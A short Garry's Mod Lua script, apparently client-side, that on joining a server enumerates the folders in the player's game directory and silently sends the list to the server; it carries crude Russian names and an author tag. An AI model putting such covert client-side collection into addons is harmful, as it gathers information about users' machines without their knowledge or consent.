hook.Add("InitPostEntity", "pavetr.obkaker_hacks", function()
	local _, folders = file.Find("*", "BASE_PATH")
	net.Start("pavetr.mymotherisshluxa")
	net.WriteTable(folders)
	net.SendToServer()
end)

-- ponos by pavetryanka